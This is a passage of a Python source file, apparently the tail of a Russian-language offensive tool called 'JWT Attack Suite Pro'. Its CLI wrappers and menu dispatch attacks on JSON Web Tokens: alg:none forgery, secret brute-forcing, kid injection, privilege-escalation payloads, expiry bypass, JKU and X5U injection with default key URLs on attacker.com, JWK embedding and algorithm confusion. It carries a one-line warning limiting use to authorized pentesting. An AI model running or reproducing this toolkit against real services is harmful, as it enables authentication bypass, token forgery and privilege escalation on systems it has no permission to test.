        console.print(f"[red]HTML: {exc}[/red]")
        return None


# ===========================================================================
# CLI wrappers (совместимы со старыми)
# ===========================================================================

def cli_decode(token: str) -> None:
    d = show_jwt(token)
    if d.valid_structure:
        notes = _analyze_notes(d)
        if notes:
            _save_finding(JWTFinding(
                kind="jwt_analysis",
                severity="high" if any(n[0] == "critical" for n in notes)
                          else "medium",
                title="JWT analysis: weak config",
                target=d.header.get("alg", "?"),
                evidence="\n".join(f"- {msg}" for _, msg in notes),
                data={"header": d.header, "notes": [n[1] for n in notes]},
            ))


def cli_none(token: str) -> None:
    show_alg_none(token)


def cli_crack(token: str, wordlist: str | None = None) -> None:
    crack_hs256(token, wordlist)


def cli_kid(token: str) -> None:
    kid_injection(token)


def cli_privesc_export(token: str, secret: str | None = None) -> None:
    cli_privesc(token, secret)


def cli_confusion(token: str, pubkey: str) -> None:
    alg_confusion_attack(token, pubkey)


def cli_confusion_jwks(token: str, jwks_url: str) -> None:
    alg_confusion_from_jwks(token, jwks_url)


def cli_generate_export(payload_json: str, secret: str = "secret",
                         alg: str = "HS256") -> None:
    """CLI генерация из JSON строки."""
    try:
        payload = json.loads(payload_json)
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]JSON: {exc}[/red]")
        return
    token = generate_token(payload, secret, alg)
    if token:
        console.print(token)


def cli_jwks(secret: str = "any") -> None:
    jwks_server_helper(secret)


# ===========================================================================
# Menu
# ===========================================================================

def menu() -> None:
    table = Table(title="[bold]🔑 JWT Attack Suite Pro[/bold]")
    table.add_column("№", style="yellow")
    table.add_column("Опция")
    opts = [
        ("1", "Декодировать + анализ JWT"),
        ("2", "alg:none attack (6 вариантов)"),
        ("3", "Brute HS256/384/512 секрет"),
        ("4", "kid injection (20 payloads)"),
        ("5", "Privesc payloads (23 поля)"),
        ("6", "Expiry bypass"),
        ("7", "JKU injection (свой JWKS)"),
        ("8", "JWK embed attack"),
        ("9", "Alg-confusion RS→HS (PEM)"),
        ("10", "Alg-confusion из JWKS URL"),
        ("11", "Генерация JWKS файла"),
        ("12", "Генерация валидного токена"),
        ("13", "X5U injection"),
        ("14", "Экспорт анализа в HTML"),
    ]
    for n, t in opts:
        table.add_row(n, t)
    console.print(table)
    console.print("[yellow]⚠ Только для авторизованного пентеста.[/yellow]")
    c = Prompt.ask("Выбор", choices=[o[0] for o in opts])

    token = ""
    if c not in ("11", "12"):
        token = Prompt.ask("JWT токен")

    if c == "1":
        d = show_jwt(token)
        if d.valid_structure:
            if Confirm.ask("Экспорт в HTML?", default=False):
                export_html(token, _analyze_notes(d))
    elif c == "2":
        show_alg_none(token)
    elif c == "3":
        wl = Prompt.ask("Словарь (пусто = встроенный)", default="")
        crack_hs256(token, wl or None)
    elif c == "4":
        kid_injection(token)
    elif c == "5":
        secret = Prompt.ask("HMAC-секрет (пусто = alg:none)",
                             default="")
        cli_privesc(token, secret or None)
    elif c == "6":
        secret = Prompt.ask("HMAC-секрет (пусто = alg:none)",
                             default="")
        new = expiry_bypass(token, secret or None)
        console.print(f"[green]{new}[/green]")
    elif c == "7":
        jwks_server_helper()
        url = Prompt.ask("JWKS URL (твой сервер)",
                          default="https://attacker.com/jwks.json")
        secret = Prompt.ask("HMAC secret", default="any")
        jku_injection(token, url, secret)
    elif c == "8":
        secret = Prompt.ask("HMAC secret", default="any")
        jwk_embed_attack(token, secret)
    elif c == "9":
        pk = Prompt.ask("Путь к публичному ключу (PEM)")
        alg_confusion_attack(token, pk)
    elif c == "10":
        url = Prompt.ask("JWKS URL")
        alg_confusion_from_jwks(token, url)
    elif c == "11":
        secret = Prompt.ask("Secret для JWKS", default="any")
        jwks_server_helper(secret)
    elif c == "12":
        cli_generate()
    elif c == "13":
        url = Prompt.ask("X5U URL (сертификат)",
                          default="https://attacker.com/cert.pem")
        x5u_injection(token, url)
    elif c == "14":
        d = show_jwt(token)
        if d.valid_structure:
            export_html(token, _analyze_notes(d))